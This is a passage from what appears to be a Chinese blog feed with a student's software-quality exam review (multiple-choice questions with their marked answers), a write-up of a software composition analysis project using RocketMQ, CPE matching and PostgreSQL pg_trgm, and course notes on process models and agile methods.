<p>B. 智力工作的激励方式中，应该尽可能使用鼓励承诺这种方式； </p>
<p>C. 麦克勒格的X理论适合用马斯洛底层需求激励； </p>
<p>D. 海兹伯格的激励理论区分为内在因素和外在因素两种</p>
</li>
<li><p>下述关于WBS的描述中，哪些说法不正确的？ </p>
<p><strong>&#x3D;&#x3D;A. WBS应该对应OBS&#x3D;&#x3D;</strong> </p>
<p>B. WBS提供了范围管理的基础 </p>
<p>C. WBS工作分解最底层的要素是实现目标的充分必要条件 </p>
<p>D. WBS分解的时候，同一层不能应用不同标准</p>
</li>
<li><p>下述关于EVM的描述中，哪些说法不正确的？ </p>
<p>A. EVM不适用于质量管理 </p>
<p><strong>&#x3D;&#x3D;B. EVM的中级实现中引入成本信息&#x3D;&#x3D;</strong> </p>
<p>C. EVM高度依赖估算准确 </p>
<p>D. EVM可以适应需求变更</p>
</li>
<li><p>关于PSP质量管理策略，下列说法中<strong>正确</strong>的是： </p>
<p><strong>&#x3D;&#x3D;A. 用缺陷管理替代质量管理，既有必要性，也有合理性；&#x3D;&#x3D;</strong> </p>
<p>&#x3D;&#x3D;<strong>B. 基本无缺陷的开发是通过开展高质量的评审来实现的；</strong>&#x3D;&#x3D;</p>
<p>C. 经过训练，评审是所有消除缺陷的手段当中最高效的； </p>
<p>&#x3D;&#x3D;<strong>D. PSP质量策略主要解决的是外部质量，而非内部质量；</strong>&#x3D;&#x3D;</p>
</li>
<li><p>关于DRL，下列说法中<strong>不正确</strong>的是： </p>
<p>A. 这是一种模块级开发中质量控制的指标 </p>
<p>B. DRL以单元测试每小时发现缺陷率作为基准，考察上游其他缺陷消除阶段的消除效率； </p>
<p>&#x3D;&#x3D;<strong>C. DRL以单元测试发现的缺陷个数作为基准，考察上游其他缺陷消除阶段消除缺陷的效率；</strong>&#x3D;&#x3D; </p>
<p>&#x3D;&#x3D;<strong>D. DRL只能预测，不能度量</strong>&#x3D;&#x3D;</p>
</li>
<li><p>关于PQI，下列说法中<strong>不正确</strong>的是： </p>
<p>A. PQI表征模块级别开发中的过程规范化程度 </p>
<p>&#x3D;&#x3D;<strong>B. PQI越高越好，可以充分保障质量；</strong>&#x3D;&#x3D; </p>
<p>&#x3D;&#x3D;<strong>C. PQI越低越好；</strong>&#x3D;&#x3D; </p>
<p>&#x3D;&#x3D;<strong>D. PQI不能用作质量规划</strong>&#x3D;&#x3D;</p>
</li>
<li><p>关于PQI，下列说法中<strong>正确</strong>的是： </p>
<p><strong>&#x3D;&#x3D;A. PQI可以辅助判断模块开发质量&#x3D;&#x3D;</strong> </p>
<p>&#x3D;&#x3D;<strong>B. PQI可以提供过程改进的依据</strong>&#x3D;&#x3D; </p>
<p>C. PQI确保大于1，从而确保开发质量； </p>
<p>D. PQI只能预测，不能度量</p>
</li>
<li><p>关于Yield，下列说法中<strong>正确</strong>的是： </p>
<p><strong>A. Yield可以辅助判断模块开发质量</strong> </p>
<p><strong>B. Yield可以提供过程改进的依据</strong> </p>
<p><strong>C. Yield区分为Process Yield和Phase Yield；</strong> </p>
<p><strong>D. Yield只能预测，不能度量</strong></p>
</li>
<li><p>关于评审速度，下列说法中正确的是： </p>
<p>A. 进行代码评审的时候，控制评审速度不超过每小时1000LOC就能实现大部分质量要求； </p>
<p>B. 实战中，评审速度应该根据资源水平而定，时间充分就评审慢一些； </p>
<p><strong>&#x3D;&#x3D;C. 文档评审速度应该控制每小时不超过4页；&#x3D;&#x3D;</strong> </p>
<p>D. 评审速度与人的技能有关，技能强的人可以突破 每小时1000 LOC代码这个限制；</p>
</li>
<li><p>关于Humphrey 梳理的Quality Journey，下列说法中正确的是： </p>
<p>A. Quality Journey中列出的步骤可以在适当的时候更换顺序； </p>
<p>B. 由于需求是一切工程活动的基础，因此加强需求开发应该是Quality Journey早期的必备步骤； </p>
<p>&#x3D;&#x3D;<strong>C. Quality Journey仍然仅仅是在“用缺陷管理替代 质量管理”这一基本策略之下进行讨论；</strong>&#x3D;&#x3D; </p>
<p>&#x3D;&#x3D;<strong>D. Quality Journey中测试应该先于评审得到贯彻和改善</strong>&#x3D;&#x3D;</p>
</li>
<li><p>下述设计模板中用来记录内部动态信息的是： </p>
<p>A. OST； </p>
<p><strong>&#x3D;&#x3D;B. SST；&#x3D;&#x3D;</strong> </p>
<p>C. LST； </p>
<p>D. FST；</p>
</li>
<li><p>下述关于PSP四大设计模板和UML典型设计图 的描述中<strong>完全正确</strong>的是： </p>
<p>A.OST在UML中没有对应的设计图； </p>
<p>&#x3D;&#x3D;<strong>B. UML中的类结构以及类之间的关系，在PSP四大设计模板中无法体现；</strong>&#x3D;&#x3D;</p>
<p>C. LST在UML中可以通过类图来体现； </p>
<p>D.FST在UML中可以通过类图来体现；</p>
</li>
<li><p>一个完全正确的状态机应该满足： </p>
<p>&#x3D;&#x3D;<strong>A.没有死循环和陷阱；</strong>&#x3D;&#x3D;</p>
<p>&#x3D;&#x3D;<strong>B. 状态转化条件满足正交性；</strong>&#x3D;&#x3D; </p>
<p><strong>&#x3D;&#x3D;C.状态转化条件满足完整性；&#x3D;&#x3D;</strong> </p>
<p>D.状态转化条件满足独立性；</p>
</li>
<li><p>下列关于各种设计验证手段的描述中正确的是： </p>
<p>A.执行表是唯一一种提供全面设计验证的手段； </p>
<p>B. 跟踪表是唯一一种提供全面设计验证的手段； </p>
<p><strong>&#x3D;&#x3D;C.受限于手工方式，都易于出错；&#x3D;&#x3D;</strong> </p>
<p>D.符号化执行验证不适合复杂的计算过程；</p>
</li>
<li><p>关于使用程序正确性证明手段验证while-do循 环设计的描述中，正确的是： </p>
<p><strong>A. 如果设计是正确的，那么应满足的条件之一是循环判断条件最后一定可以变为false；</strong> </p>
<p><strong>B. 如果设计是正确的，那么应满足的条件之一是循环判断条件为真的时候，单独的循环结构执行结果与 循环体再加一个循环结构，其执行结果一致；</strong> </p>
<p><strong>C. 如果设计是正确的，那么应满足的条件之一是循环判断条件为false的时候，循环体内所有变量不能被 修改；</strong> </p>
<p><strong>D. 该方法并不能保证循环体算法实现设计意图。</strong></p>
</li>
<li><p>下面描述属于典型客户需求的是： </p>
<p><strong>A.客户期望；</strong> </p>
<p><strong>B. 预算限制；</strong> </p>
<p><strong>C.法律法规限制；</strong> </p>
<p>D.系统功能描述</p>
</li>
<li><p>在团队设计活动中，应该注意设计标准，下列属于典型的设计标准应该约定的是： </p>
<p><strong>A.命名规范；</strong> </p>
<p><strong>B.接口标准；</strong> </p>
<p><strong>C.出错或者异常处理信息；</strong> </p>
<p><strong>D.设计表示方式</strong></p>
</li>
<li><p>典型地，在团队设计活动中，应该注意哪些内容： </p>
<p><strong>A.设计标准的应用；</strong> </p>
<p><strong>B.复用的考虑；</strong> </p>
<p><strong>C.可测试性支持；</strong> </p>
<p><strong>D.可用性支持</strong></p>
</li>
<li><p>关于集成策略，下述描述中正确的是： </p>
<p>A. 当待集成组件质量普遍不高的时候，不可以使用扁平化策略； </p>
<p><strong>B. 当需要尽早获取可以工作的组件的时候， 应该使用集簇式策略；</strong> </p>
<p><strong>C. 当待集成组件质量普通较高的时候，可以使用大爆炸式集成策略；</strong> </p>
<p><strong>D. 持续集成本质上就是逐一添加策略。</strong></p>
</li>
<li><p>当考虑集成策略的时候，应该注意如下哪些方面？： </p>
<p><strong>A. 待集成组件的质量状态；</strong> </p>
<p>B. 待集成组件的获取方式； （自己开发 购买 服用</p>
<p><strong>C. 待集成组件的功能和关系；</strong> </p>
<p><strong>D. 待集成组件的数量；</strong>(rgp的意思可能要选)</p>
</li>
<li><p>关于扁平化集成策略和集簇式集成策略，下述说法中正确的是： </p>
<p><strong>A. 扁平化策略可以较早地充分地暴露系统级别的错误；</strong> </p>
<p><strong>B. 扁平化策略对于系统级别错误的暴露能力有限；</strong> </p>
<p><strong>C. 集簇式集成策略有助于复用策略的实现；</strong> </p>
<p><strong>D. 扁平化策略和集簇式策略的优缺点正好相反；</strong></p>
</li>
<li><p>下述活动是典型的验证（Verification）的是： </p>
<p><strong>A. 需求评审；</strong> </p>
<p><strong>B. 详细设计评审；</strong> </p>
<p><strong>C. 单元测试；</strong> </p>
<p>D. 试运行；</p>
</li>
<li><p>下述活动是典型的确认（Validation）的是： </p>
<p><strong>A. 验收测试；</strong> </p>
<p>B. 代码评审； </p>
<p>C. 系统测试； </p>
<p>D. 持续集成；</p>
</li>
<li><p>下述产物中属于典型的确认（Validation）对象的是： </p>
<p>A.接口设计文档； </p>
<p><strong>B.源代码；</strong> </p>
<p><strong>C.用户手册；</strong> </p>
<p><strong>D.系统使用培训材料（视频、录像等）；</strong></p>
</li>
<li><p>下述关于需求开发的描述中，哪些是正确的？ </p>
<p>A. 客户需求是指客户提出的关于软件功能的具体要求 </p>
<p>B. 工期或者预算往往都是客户需求的一个方面 </p>
<p>C. 产品需求需要跟客户充分讨论才能获取 </p>
<p>D. 客户应该在需求开发活动中起到主导作用</p>
</li>
<li><p>下述产物中属于典型的配置项是： </p>
<p><strong>A. 接口设计文档；</strong> </p>
<p><strong>B. 源代码；</strong> </p>
<p><strong>C. 用户手册；</strong> </p>
<p><strong>D. 系统使用培训材料（视频、录像等）；</strong></p>
</li>
<li><p>团队内部的配置审计通常应该关注什么： （AD可能对？）</p>
<p>A. 物理审计； </p>
<p><strong>B. 配置项列表；</strong> </p>
<p><strong>C. 配置管理记录；</strong> </p>
<p>D. 基线计划；</p>
</li>
<li><p>下列关于决策分析的论述中，不恰当的是： </p>
<p>A. 决策分析指南中最关键的是明确需要开展决策分析活动的判定标准，即什么场合之下需要开展正式的决策分析活动； </p>
<p><strong>B.评价方法是体现决策者利益诉求的关键，因此，需要谨慎设计；</strong> </p>
<p>C.候选方案的识别应该晚于于评价标准； </p>
<p><strong>D.现实生活中的项目投标就是一个典型的决策分析活动；</strong></p>
</li>
<li><p>下列关于根因分析的论述中，不恰当的是： </p>
<p><strong>A. 根因分析必须基于丰富的数据来选择合适的问题；</strong> </p>
<p>B. 鱼骨图是根因分析的有效手段； </p>
<p>C. 典型地，可以从技术、人员、培训以及过程角度开展根因分析； </p>
<p><strong>D. 根因分析活动终止的唯一特征就是找到相应的根因的明确解决方案；</strong></p>
</li>
</ol>
]]></content>
      <categories>
        <category>软件质量与管理</category>
      </categories>
      <tags>
        <tag>期末复习</tag>
        <tag>软件质量与管理</tag>
      </tags>
  </entry>
  <entry>
    <title>软件成分分析系统——项目经历</title>
    <url>/2025/02/09/%E9%A1%B9%E7%9B%AE%E7%BB%8F%E5%8E%86/</url>
    <content><![CDATA[<h1 id="软件成分分析系统"><a href="#软件成分分析系统" class="headerlink" title="软件成分分析系统"></a><strong>软件成分分析系统</strong></h1><p>**项目简介：**开发基于包管理器构建过程的软件成分分析系统，采用BuildScan动态检测技术，支持Java&#x2F;JS&#x2F;Python&#x2F;Go多语言依赖 关系解析，实现漏洞风险识别、许可证合规分析、软件资产统一管理，并自动化生成符合行业标准的SBOM（软件物料清单）及 可视化安全报告。 </p>
<p>**技术栈：**SpringBoot，PostgreSQL，Redis，RocketMQ，maven&#x2F;gradle&#x2F;npm&#x2F;pip&#x2F;go modules包管理器 </p>
<p><strong>主要功能：</strong></p>
<ol>
<li><p>提取项目中的配置文件，基于包管理器构建完整依赖树，并即时返回初步结果。 </p>
</li>
<li><p>采用 RocketMQ 将组件信息采集、漏洞匹配和许可证识别任务异步拆分，并结合多线程并发处理，加速整体数据处理流程。 </p>
</li>
<li><p>依据CPE规范构建组件标识，通过PostgreSQL的pg_trgm插件+GIN索引实现相似度高效匹配漏洞信息。 </p>
</li>
<li><p>聚合多源许可证数据，分析权利&#x2F;义务条款并构建冲突检测规则引擎。 </p>
</li>
<li><p>生成符合CycloneDX&#x2F;SPDX规范的软件物料清单，支持XML&#x2F;JSON多格式输出</p>
</li>
</ol>
<h2 id="异步处理"><a href="#异步处理" class="headerlink" title="异步处理"></a>异步处理</h2><p>在 SCA（软件成分分析）系统的异步设计中，我们利用 <strong>RocketMQ</strong> 进行解耦，将 <strong>组件查询、缺失组件爬取、漏洞匹配</strong> 这三个 I&#x2F;O 密集型任务异步化，提高系统的吞吐量和并发能力。</p>
<p>具体来说，我们采用 <strong>消息队列</strong> 设计，将 <strong>解析依赖树后</strong> 的组件查询任务推送到 <code>component-query-queue</code>，如果组件缺失，则发送爬取任务到 <code>component-crawl-queue</code>，每一个组件查询完成后，再异步执行 <code>vulnerability-match-queue</code> 进行漏洞匹配。</p>
<p>在实现上，我们使用 <strong>RocketMQ 生产者推送任务，消费者监听队列</strong> 进行异步处理，并结合 <strong>线程池并发查询</strong> 以及 <strong>Redis 幂等性校验</strong>，确保任务高效执行，同时防止重复消费或数据不一致的问题。</p>
<p>这样，整个 SCA 任务执行过程能够更快响应，避免同步阻塞，提高系统扩展性和稳定性，同时也为后续增加更多语言或优化流程提供了良好的架构支持。</p>
<h2 id="多语言框架"><a href="#多语言框架" class="headerlink" title="多语言框架"></a>多语言框架</h2><p>SCA 系统需要分析 Java、Python、JavaScript、Go 四种语言的项目，每种语言的处理方式不同，但总体流程相同，具体包括以下步骤：</p>
<ol>
<li><strong>上传项目</strong></li>
<li><strong>生成依赖树</strong>（执行包管理器命令）</li>
<li><strong>解析依赖树</strong>，（然后将组件查询任务推送到 <code>component-query-queue</code>，最后返回前端）</li>
<li><strong>查询组件信息</strong>，（将缺失组件爬取任务推送到 <code>component-crawl-queue</code>，然后结束）</li>
<li><strong>爬取缺失组件信息</strong>，（同时匹配许可证），线程池处理，并将漏洞匹配任务推送到<code>vulnerability-match-queue</code> ，然后结束</li>
<li><strong>匹配组件的漏洞信息</strong>，结束</li>
</ol>
<p>具体的，首先定义一个统一的sca处理器，和一个统一的消费者。然后定义不同语言的策略，和一个工厂用来根据语言生成策略。上传项目后，sca处理器根据语言，从工厂获得对应语言的策略，然后调用策略的方法生成依赖树、解析依赖树，然后将组件查询任务推送到 <code>component-query-queue</code>，并返回前端。</p>
<p>消费者接受消息后，首先根据topic选择，</p>
<h2 id="漏洞匹配"><a href="#漏洞匹配" class="headerlink" title="漏洞匹配"></a>漏洞匹配</h2><h3 id="CPE"><a href="#CPE" class="headerlink" title="CPE"></a>CPE</h3><p>CPE（<strong>Common Platform Enumeration</strong>）是一个用于标识软件和硬件平台的标准化命名系统。CPE 使用特定格式来表示一个软件、硬件或操作系统的标识符。通常，CPE 标识符遵循类似于下面的格式：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">cpe:</span><span class="number">2.3</span><span class="symbol">:a</span><span class="symbol">:apache</span><span class="symbol">:http_server</span><span class="symbol">:</span><span class="number">2.4</span>.<span class="number">49</span><span class="symbol">:*</span><span class="symbol">:*</span><span class="symbol">:*</span><span class="symbol">:*</span><span class="symbol">:*</span><span class="symbol">:*</span><span class="symbol">:*</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>cpe:2.3</code>：表示使用的是 CPE 版本 2.3。</li>
<li><code>a</code>：表示组件类型（软件&#x2F;硬件&#x2F;OS）</li>
<li><code>apache</code>：厂商名。</li>
<li><code>http_server</code>：产品名。</li>
<li><code>2.4.49</code>：版本号。</li>
<li><code>*:*:*:*:*:*:*</code>：更新版本、发行版、语言、软件类型、硬件架构、其他等</li>
</ul>
<h3 id="pg-trgm-插件"><a href="#pg-trgm-插件" class="headerlink" title="pg_trgm 插件"></a>pg_trgm 插件</h3><p><code>pg_trgm</code> 插件是 PostgreSQL 中用于加速模糊匹配和相似度计算的工具，它使用 <strong>trigram</strong>（三元组）来将字符串分解为连续的三字符片段，并使用这些片段来计算两个字符串之间的相似度。通过这种方式，<code>pg_trgm</code> 可以帮助我们计算字符串间的相似度，即使它们存在拼写错误、字符交换或省略。</p>
<p>在这个过程中，<code>pg_trgm</code> 插件可以对 CPE 标识符进行拆解，以便通过类似的字符串或不完全匹配找到相似的漏洞信息。CPE 标识符可能会有一些拼写错误或不同版本的表达方式，因此使用 <code>pg_trgm</code> 插件能够有效捕捉到相似的组件信息。</p>
<p>具体的原理：例如对于<code>hello</code>，可以分为{“ h”, “ he”, “hel”, “ell”, “llo”, “lo “}，另一个字符串也同样划分后，通过计算 **两个三元组集合的交集 &#x2F; 并集 **作为相似度。</p>
<h3 id="GIN索引（倒排索引）"><a href="#GIN索引（倒排索引）" class="headerlink" title="GIN索引（倒排索引）"></a>GIN索引（倒排索引）</h3><p><strong>GIN</strong>（Generalized Inverted Index）是 PostgreSQL 的一种索引类型，用于加速处理包含多值数据的字段，如数组、文本搜索、JSONB 等。<strong>GIN 索引</strong>为每个值构建倒排索引，这使得查询速度显著提高，特别是在需要进行模糊匹配、全文搜索时。</p>
<p><strong>倒排索引</strong>会记录每个值在哪些文档（或行）中出现。比如，对于一个文本字段，你的倒排索引可能看起来像这样：</p>
<ul>
<li><code>word1 -&gt; &#123;1, 2, 5&#125;</code></li>
<li><code>word2 -&gt; &#123;1, 3&#125;</code></li>
<li><code>word3 -&gt; &#123;2, 4&#125;</code></li>
</ul>
<p>这个倒排结构允许快速定位包含某个单词的行。</p>
<h3 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h3><ol>
<li><p>根据组件名、厂商、版本等信息构建自定义cpe，其中有含版本号和不含版本号两个cpe</p>
</li>
<li><p>根据自定义cpe，到cve_cpe表中进行相似度查询，找到所有对应的cve_cpe。</p>
<p>2.1. trgm将cpe拆解为一个个三元组</p>
<p>2.2. 每一个三元组都建立了倒排索引，可以快速定位到匹配的行</p>
<p>2.3. 再计算这些行的cpe与自定义cpe的相似度，筛选出相似度高的</p>
</li>
<li><p>对这些找到的cve_cpe进行召回，限定cpe中的单词至少需精准包含组件名称单词的半数以上以防止误判，以及检查组件版本是否处于规定的漏洞影响起始和终止版本之间</p>
</li>
<li><p>根据cve_cpe中的cve，到cve表中查到对应的漏洞</p>
</li>
</ol>
<h2 id="RocketMQ"><a href="#RocketMQ" class="headerlink" title="RocketMQ"></a>RocketMQ</h2><h3 id="顺序性"><a href="#顺序性" class="headerlink" title="顺序性"></a>顺序性</h3><p>Rocketmq有两种顺序消费模式。</p>
<p> <strong>全局顺序（Global Order）</strong></p>
<ul>
<li><strong>所有消息</strong> 只能进入 <strong>同一个队列（Queue）</strong>，并且由 <strong>一个消费者</strong> 进行顺序消费。</li>
<li><strong>优点</strong>：保证全局严格顺序。</li>
<li><strong>缺点</strong>：吞吐量受限，单个消费者成为性能瓶颈。</li>
</ul>
<p> <strong>分区顺序（Partition Order）</strong></p>
<ul>
<li><strong>不同业务标识（如订单 ID）</strong> 绑定到特定 <strong>消息队列（Queue）</strong>，同一个 Queue 内保证顺序，但不同 Queue 可并行消费。</li>
<li><strong>优点</strong>：既保证局部顺序，又能提高吞吐量。</li>
<li><strong>缺点</strong>：如果一个 Queue 处理变慢，可能会影响该 Queue 内的所有消息。</li>
</ul>
<h4 id="分区消费实现"><a href="#分区消费实现" class="headerlink" title="分区消费实现"></a>分区消费实现</h4><p>生产者在sendMessage时，自定义一个MessageQueueSelector消息队列选择器，在里面手动选择queue，例如可以：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">SendResult</span> <span class="variable">sendResult</span> <span class="operator">=</span> producer.send(msg, (mqs, msg1, arg) -&gt; &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">orderId</span> <span class="operator">=</span> (<span class="type">int</span>) arg;  <span class="comment">// 从 arg 获取 orderId</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">queueIndex</span> <span class="operator">=</span> orderId % mqs.size();  <span class="comment">// 计算要进入的队列索引</span></span><br><span class="line">    <span class="keyword">return</span> mqs.get(queueIndex);</span><br><span class="line">&#125;, orderId);  <span class="comment">// 这里传入 orderId 作为 arg</span></span><br></pre></td></tr></table></figure>

<h3 id="消息发送的可靠性"><a href="#消息发送的可靠性" class="headerlink" title="消息发送的可靠性"></a>消息发送的可靠性</h3><p>RocketMQ 提供了几种不同的 <strong>发送消息的模式</strong>，可以保证消息是否成功发送到 Broker。</p>
<p><strong>同步发送（Sync）</strong></p>
<ul>
<li>同步发送是最常见的方式，生产者发送消息后，会 <strong>阻塞等待</strong> Broker 的返回结果，直到收到确认信息。同步发送能确保消息确实到达 Broker，并提供准确的发送结果。</li>
<li>同步发送在发送失败时，通常会依赖于 <strong>重试机制</strong>。RocketMQ 提供了自动重试的功能，在发生发送失败时，它会 <strong>自动重试</strong> 多次，直到达到最大重试次数，或者成功发送消息。</li>
</ul>
<p><strong>异步发送（Async）</strong></p>
<ul>
<li>异步发送是另一种方式，生产者发送消息后不会等待返回结果，而是 <strong>通过回调函数</strong> 处理发送结果。虽然不阻塞，但可能会因为消息发送失败而需要在回调中处理。</li>
<li>异步发送的失败需要在回调函数中显式处理，RocketMQ 不会自动重试。</li>
</ul>
<p><strong>一次消息发送（Oneway）</strong></p>
<ul>
<li>在这种模式下，生产者 <strong>不等待任何确认</strong>，直接将消息发送到 Broker。适用于 <strong>不关心消息是否成功发送</strong> 的场景。</li>
</ul>
<h3 id="消息保存的可靠性"><a href="#消息保存的可靠性" class="headerlink" title="消息保存的可靠性"></a>消息保存的可靠性</h3><ul>
<li>异步&#x2F;同步刷盘</li>
<li>异步&#x2F;同步主从复制</li>
</ul>
<h3 id="消息接收的可靠性"><a href="#消息接收的可靠性" class="headerlink" title="消息接收的可靠性"></a>消息接收的可靠性</h3><p>取消自动，消费完成后手动ack</p>
<p>延迟重试（每次延迟增大）</p>
<p>多次重试失败后进入死信队列，手动处理或定时任务处理</p>
<h3 id="幂等"><a href="#幂等" class="headerlink" title="幂等"></a>幂等</h3><p>redis id &#x2F; 数据库id</p>
]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>依赖管理</tag>
      </tags>
  </entry>
  <entry>
    <title>软件质量与管理2023 期末复习</title>
    <url>/2024/12/15/%E8%BD%AF%E4%BB%B6%E8%B4%A8%E9%87%8F%E4%B8%8E%E7%AE%A1%E7%90%86-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="软件开发四大本质难题"><a href="#软件开发四大本质难题" class="headerlink" title="软件开发四大本质难题"></a>软件开发四大本质难题</h4><ol>
<li>不可见性（不因项目而异）、复杂性、可变性、一致性</li>
</ol>
<h4 id="软件发展三大阶段"><a href="#软件发展三大阶段" class="headerlink" title="软件发展三大阶段"></a>软件发展三大阶段</h4><ol>
<li><p>软硬件一体化：软件支持硬件完成计算任务、功能单一、复杂度有限、几乎不需要需求变更；<strong>measure twice cut once、code and fix；</strong></p>
</li>
<li><p>软件成为独立的产品：摆脱了硬件的束缚、功能强大、需求多变、兼容性要求、来自市场的压力；<strong>形式化方法、结构化程序和瀑布生命周期模型、成熟度模型；</strong></p>
</li>
<li><p>网络化和服务化：功能更复杂 、规模更大、用户数量急剧增加、快速演化和需求不确定、分发方式的变化、进一步的服务化和网络化、盛行开源和共享文化；<strong>迭代式开发、敏捷开发、开源软件开发方式、DevOps；</strong></p>
</li>
<li><p>管理的三大关键要素：目标、状态、纠偏</p>
</li>
<li><p>软项目管理的三大目标：成本、质量、工期</p>
</li>
</ol>
<span id="more"></span>

<h4 id="生命周期模型"><a href="#生命周期模型" class="headerlink" title="生命周期模型"></a>生命周期模型</h4><ol>
<li><p>生命周期模型是对一个软件开发过程的人为划分</p>
</li>
<li><p>生命周期模型是软件开发过程的主框架，是对软件开发过程的一种粗粒度划分</p>
</li>
<li><p>生命周期模型往往不包括技术实践</p>
</li>
</ol>
<h4 id="DevOps"><a href="#DevOps" class="headerlink" title="DevOps"></a>DevOps</h4><ol>
<li><p>开发运维一体化</p>
</li>
<li><p>方法论的基础是软件敏捷开发、精益思想和看板 KanBan 方法</p>
</li>
<li><p>以领域驱动设计为指导的微服务架构方式</p>
</li>
<li><p>大量虚拟化技术的使用</p>
</li>
<li><p>一切皆服务 XaaS 的理念指导</p>
</li>
<li><p>构建了强大的工具链，支持高水平自动化</p>
</li>
</ol>
<h3 id="过程改进模型"><a href="#过程改进模型" class="headerlink" title="过程改进模型"></a>过程改进模型</h3><h4 id="过程改进模型：CMMI"><a href="#过程改进模型：CMMI" class="headerlink" title="过程改进模型：CMMI"></a>过程改进模型：CMMI</h4><ol>
<li>initial：开发相对混乱，没有过程概念，依赖个人英雄主义，救活文化盛行；</li>
<li>managed：项目小组体现出项目管理的特征，有项目计划和跟踪、需求管理、配置管理等；</li>
<li>defined：公司层面有标准流程和相应的规范，每个项目小组可以基于此定义自己的过程，使得优秀的做法在公司间流传；</li>
<li>quantitatively managed：构建预测模型，以统计过程控制的手段来管理过程；</li>
<li>optimizing：继续应用统计方法来识别过程偏差，找到问题根源并消除，避免未来继续发生类似问题；</li>
</ol>
<h4 id="过程改进模型：PDCA"><a href="#过程改进模型：PDCA" class="headerlink" title="过程改进模型：PDCA"></a>过程改进模型：PDCA</h4><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20240102134036937.png" alt="image-20240102134036937" style="zoom:50%;" />

<ol>
<li>分析现状，找出问题</li>
<li>分析影响质量的原因</li>
<li>找出措施</li>
<li>拟定措施计划</li>
<li>执行措施，执行计划</li>
<li>检查效果，发现问题</li>
<li>总结经验，纳入标准</li>
<li>遗留问题转入下期PDCA循环</li>
</ol>
<h4 id="过程改进模型：IDEAL"><a href="#过程改进模型：IDEAL" class="headerlink" title="过程改进模型：IDEAL"></a>过程改进模型：IDEAL</h4><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20240102133953844.png" alt="image-20240102133953844" style="zoom:50%;" />

<ol>
<li>initiating 初始</li>
<li>diagnosing 诊断</li>
<li>establishing 建立</li>
<li>acting 执行</li>
<li>leveraging 调整</li>
</ol>
<h4 id="过程管理模型：ISO-IEC-1504-（SPICE）"><a href="#过程管理模型：ISO-IEC-1504-（SPICE）" class="headerlink" title="过程管理模型：ISO&#x2F;IEC 1504 （SPICE）"></a>过程管理模型：ISO&#x2F;IEC 1504 （SPICE）</h4><h4 id="软件过程框架：RUP"><a href="#软件过程框架：RUP" class="headerlink" title="软件过程框架：RUP"></a>软件过程框架：RUP</h4><h3 id="敏捷开发"><a href="#敏捷开发" class="headerlink" title="敏捷开发"></a>敏捷开发</h3><h4 id="敏捷宣言"><a href="#敏捷宣言" class="headerlink" title="敏捷宣言"></a>敏捷宣言</h4><ol>
<li>个人和互动 胜过 工具和流程</li>
<li>可以工作的软件 胜过 详尽的文档</li>
<li>客户合作 胜过 合同谈判</li>
<li>响应变化 胜过 遵循计划</li>
<li>尽管认为右边有价值，但更重视左边的价值</li>
</ol>
<h4 id="敏捷开发方法：极限编程-XP"><a href="#敏捷开发方法：极限编程-XP" class="headerlink" title="敏捷开发方法：极限编程 XP"></a>敏捷开发方法：极限编程 XP</h4><ol>
<li>客户作为开发团队的成员</li>
<li>短交付周期</li>
<li>结对编程</li>
<li>测试驱动开发</li>
<li>持续集成</li>
<li>重构</li>
<li>每周工作时间 &lt;&#x3D;40小时</li>
</ol>
<h4 id="敏捷开发方法：Scrum"><a href="#敏捷开发方法：Scrum" class="headerlink" title="敏捷开发方法：Scrum"></a>敏捷开发方法：Scrum</h4><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20240102133937507.png" alt="image-20240102133937507" style="zoom:50%;" />

<ol>
<li>Scrum中的文档：产品订单、冲刺订单、燃尽图</li>
<li>Scrum中的角色：产品负责人、Scrum Master、开发团队</li>
<li>产品订单（product backlog)：整个项目的概要文档，包含了已划分优先等级的、项目要开发的系统或产品的需求清单，是动态的。</li>
<li>冲刺订单（sprint backlog)：细化了的文档，包含了团队如何实现下一个冲刺的需求信息。<ol>
<li>哪些产品订单会加入一次冲刺由冲刺计划会议决定。会议中，产品负责人告诉开发团队他们需要完成产品订单中的哪些订单项，开发团队决定在下一次冲刺中承诺完成多少订单项。</li>
<li>在冲刺的过程中，没有人能够变更冲刺订单（sprint backlog)，这意味着在一个冲刺中需求是被冻结的。</li>
</ol>
</li>
<li>燃尽图（burn down chart)</li>
</ol>
<h4 id="敏捷开发方法：Kanban"><a href="#敏捷开发方法：Kanban" class="headerlink" title="敏捷开发方法：Kanban"></a>敏捷开发方法：Kanban</h4><ol>
<li>精益生产（丰田制造法）的具体实现</li>
<li>可视化工作流、限定 WIP、管理周期时间</li>
<li>马丁提出了微服务架构</li>
</ol>
<h4 id="其他开发方法：Clean-Room、Gate"><a href="#其他开发方法：Clean-Room、Gate" class="headerlink" title="其他开发方法：Clean Room、Gate"></a>其他开发方法：Clean Room、Gate</h4><h3 id="团队动力学"><a href="#团队动力学" class="headerlink" title="团队动力学"></a>团队动力学</h3><h4 id="团队动力学：激励方式"><a href="#团队动力学：激励方式" class="headerlink" title="团队动力学：激励方式"></a>团队动力学：激励方式</h4><ol>
<li>威逼</li>
<li>利诱</li>
<li>鼓励承诺</li>
</ol>
<h4 id="团队动力学：马斯洛的需求层次理论"><a href="#团队动力学：马斯洛的需求层次理论" class="headerlink" title="团队动力学：马斯洛的需求层次理论"></a>团队动力学：马斯洛的需求层次理论</h4><ol>
<li>Physiological 生理需求</li>
<li>Safety 安全感</li>
<li>Social 爱和归属感</li>
<li>Esteem 自尊</li>
<li>Self-Actualization 自我实现</li>
</ol>
<h4 id="团队动力学：海兹伯格的激励理论"><a href="#团队动力学：海兹伯格的激励理论" class="headerlink" title="团队动力学：海兹伯格的激励理论"></a>团队动力学：海兹伯格的激励理论</h4><ol>
<li>内在因素：成就感、责任感、晋升、被赏识、认可等；</li>
<li>外在因素：工作环境、薪金、工作关系、安全等；</li>
</ol>
